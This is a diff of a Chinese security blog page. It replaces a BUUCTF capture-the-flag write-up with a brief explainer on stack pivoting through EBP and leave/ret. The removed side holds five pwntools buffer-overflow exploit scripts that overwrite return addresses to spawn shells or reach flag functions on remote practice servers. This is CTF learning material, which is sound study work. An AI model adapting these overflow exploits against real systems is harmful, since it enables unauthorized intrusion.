@@ -4,17 +4,11 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Buuctf wp, 微凉">
-    <meta name="description" content="
-pwn1
-from pwn import *
-log_level = &#39;debug&#39;
-elf = ELF(&#34;./pwn1&#34;)
-local = 0
-if local:
-   r = process(&#34;./pwn1&#34;)
-else:
-   r ">
+    <meta name="keywords" content="栈迁移, 微凉">
+    <meta name="description" content="前置知识函数调用栈1. 什么是栈迁移?
+EBP被称为栈帧寄存器,每一次函数调用都会通过栈帧对栈内数据进行维护.当我们想办法修改EBP寄存器到其他地方,那么函数的栈空间也就发生了变化.这就叫做栈迁移.
+
+2.为什么要使用栈迁移?在什么情况下使">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -26,7 +20,7 @@ else:
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Buuctf wp | 微凉</title>
+    <title>栈迁移 | 微凉</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -213,12 +207,12 @@ else:
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Buuctf wp</h1>
+                    <h1 class="description center-align post-title">栈迁移</h1>
                 </div>
             </div>
         </div>
@@ -334,8 +328,8 @@ else:
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/buuctf/">
-                                <span class="chip bg-color">buuctf</span>
+                            <a href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/">
+                                <span class="chip bg-color">知识点</span>
                             </a>
                         
                     </div>
@@ -359,7 +353,7 @@ else:
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-01-12
+                    2022-01-14
                 </div>
                 
 
@@ -368,7 +362,7 @@ else:
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    214
+                    266
                 </div>
                 
 
@@ -393,95 +387,18 @@ else:
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <ol>
-<li><p>pwn1</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
-log_level = 'debug'
-elf = ELF("./pwn1")
-local = 0
-if local:
-   r = process("./pwn1")
-else:
-   r = remote("node4.buuoj.cn",29317)
-bin_sh = 0x000000000040118A
-system_addr = 0x0000000000401191
-
-payload = b'a'*0x0F + p64(system_addr) + p64(bin_sh)
-
-r.sendline(payload)
-
-r.interactive()
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>warmup_csaw_2016</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
-context(os='linux',arch= 'amd64',log_level='debug')
-elf = ELF("./warmup")
-local = 0
-if local:
-    r = process("./warmup")
-else:
-    r = remote("node4.buuoj.cn",29230)
-
-addr = 0x000000000040060e
-payload = b'a'*72 + p64(addr)
-
-r.sendline(payload)
-
-r.interactive()
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<ol start="3">
-<li><p>cisn_2019_n_1</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
-context(os='linux',arch='amd64',log_level='debug')
-elf=ELF("./ciscn")
-local = 0
-if local:
-    r = process("./ciscn")
-else:
-    r = remote("node4.buuoj.cn",28539)
-v2=0x41348000 //11.28125的十六进制形式
-payload = b'a'*(0x30-0x04)+p64(v2)
-r.sendline(payload)
-r.interactive()
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-</li>
-<li><p>pwn1_sctf_2016</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
-log_level = 'debug'
-elf = ELF("./pwn1_sctf")
-local = 0
-if local:
-    r = process("./pwn1_sctf")
-else:
-    r = remote("node4.buuoj.cn",28883)
-
-get_flag = 0x08048F0D
-
-payload = b'I'*20 + b'a'*4 + p32(get_flag)
-r.sendline(payload)
-
-r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>level0</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
-context(os = 'linux',arch = 'amd64',log_level = 'debug')
-elf = ELF("./level0")
-local = 0
-if local:
-    r = process("./level0")
-else:
-    r = remote("node4.buuoj.cn",26837)
-
-call_system = 0x0000000000400596
-
-payload = b'a'*0x80+p64(0)+p64(call_system)
-
-r.sendline(payload)
-
-r.interactive()
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
+                <h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h4><h3 id="1-什么是栈迁移"><a href="#1-什么是栈迁移" class="headerlink" title="1. 什么是栈迁移?"></a>1. 什么是栈迁移?</h3><ul>
+<li>EBP被称为栈帧寄存器,每一次函数调用都会通过栈帧对栈内数据进行维护.当我们想办法修改EBP寄存器到其他地方,那么函数的栈空间也就发生了变化.这就叫做栈迁移.</li>
+</ul>
+<h3 id="2-为什么要使用栈迁移-在什么情况下使用栈迁移"><a href="#2-为什么要使用栈迁移-在什么情况下使用栈迁移" class="headerlink" title="2.为什么要使用栈迁移?在什么情况下使用栈迁移?"></a>2.为什么要使用栈迁移?在什么情况下使用栈迁移?</h3><ul>
+<li>首先要知道栈溢出在什么情况下可以getshell.大多数情况下我们可输入的字符远远超过了缓冲区与栈帧之间的距离.但是如果只能输入几个字节时就可以使用栈迁移.</li>
+</ul>
+<h3 id="3-如何利用栈迁移进行溢出"><a href="#3-如何利用栈迁移进行溢出" class="headerlink" title="3.如何利用栈迁移进行溢出"></a>3.如何利用栈迁移进行溢出</h3><ul>
+<li>利用leave,ret指令.</li>
+<li>溢出时需要的前提:即使我们溢出缓冲区的字节数很少,也需要覆盖到EBP和EIP这两个地方.</li>
+<li>leave指令相当于mov esp,ebp;pop ebp .</li>
+<li>决定可以将栈空间放在哪里,ret指令调用完函数以后可以干什么.</li>
+</ul>
 
                 
             </div>
@@ -508,7 +425,7 @@ r.interactive()
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://breeze-666.github.io/2022/01/12/buuctf/">https://breeze-666.github.io/2022/01/12/buuctf/</a>
+                    <a href="https://breeze-666.github.io/2022/01/14/stack-migrate/">https://breeze-666.github.io/2022/01/14/stack-migrate/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -546,8 +463,8 @@ r.interactive()
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/buuctf/">
-                                    <span class="chip bg-color">buuctf</span>
+                                <a href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/">
+                                    <span class="chip bg-color">知识点</span>
                                 </a>
                             
                         </div>
@@ -593,17 +510,18 @@ r.interactive()
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/01/12/dice-game/">
+                <a href="/2022/01/14/stack-migrate/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="dice_game">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="栈迁移">
                         
-                        <span class="card-title">dice_game</span>
+                        <span class="card-title">栈迁移</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -613,9 +531,9 @@ r.interactive()
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-12
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-14
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -628,15 +546,12 @@ r.interactive()
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%AE%80%E5%8D%95%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%BB%95%E8%BF%87/">
-                        <span class="chip bg-color">简单随机数绕过</span>
-                    </a>
-                    
-                    <a href="/tags/xctf/">
-                        <span class="chip bg-color">xctf</span>
+                    <a href="/tags/%E7%9F%A5%E8%AF%86%E7%82%B9/">
+                        <span class="chip bg-color">知识点</span>
                     </a>
                     
                 </div>
@@ -650,13 +565,13 @@ r.interactive()
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/01/12/ret2libc3/">
+                <a href="/2022/01/13/forgot/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="ret2libc3">
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="forgot">
                         
-                        <span class="card-title">ret2libc3</span>
+                        <span class="card-title">forgot</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -667,7 +582,7 @@ r.interactive()
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-12
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-13
                             </span>
                         <span class="publish-author">
                             
@@ -683,6 +598,10 @@ r.interactive()
                 </div>
                 
                 <div class="card-action article-tags">
+                    
+                    <a href="/tags/xctf/">
+                        <span class="chip bg-color">xctf</span>
+                    </a>
                     
                     <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">
                         <span class="chip bg-color">栈溢出</span>
